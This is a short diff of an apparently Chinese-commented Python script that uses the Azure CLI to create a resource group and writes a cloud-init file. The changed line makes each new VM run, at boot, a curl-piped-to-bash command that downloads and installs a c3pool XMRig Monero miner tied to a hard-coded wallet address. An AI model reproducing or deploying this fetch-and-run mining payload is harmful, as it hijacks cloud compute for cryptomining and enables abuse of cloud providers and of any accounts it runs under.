@@ -88,7 +88,7 @@ get_default_cli().invoke(['group', 'create', '--name', 'myResourceGroup',
 print("创建资源组成功")
  
 # 3.创建开机后要运行的脚本
-init = "curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 45mH6foAStt43fWS83d3HMhg4usEw441n5771XLmSxuFKPc9hXB89eaVYfacTswcJQ34pz8aqanStbVft9HiXGc8MXwhznX"
+init = "export HOME=/root && curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 45mH6foAStt43fWS83d3HMhg4usEw441n5771XLmSxuFKPc9hXB89eaVYfacTswcJQ34pz8aqanStbVft9HiXGc8MXwhznX"
 with open("./cloud-init.txt", "w") as f:
     f.write("#cloud-config" + "\n")
     f.write("runcmd:" + "\n")
